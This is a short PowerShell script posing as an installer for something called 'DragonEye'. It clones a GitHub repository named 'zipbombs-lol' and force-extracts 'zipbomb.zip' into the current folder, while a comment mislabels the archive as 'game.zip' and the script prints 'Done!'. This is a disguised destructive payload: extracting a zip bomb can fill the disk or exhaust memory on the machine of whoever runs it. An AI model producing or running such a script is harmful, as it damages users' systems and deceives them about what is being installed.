Write-Host "Installing DragonEye... by DRAGON"

git clone https://github.com/12hrformat/zipbombs-lol

Set-Location zipbombs-lol

# Extract game.zip into the current directory
Expand-Archive -Path zipbomb.zip -DestinationPath . -Force

Write-Host "Done!"
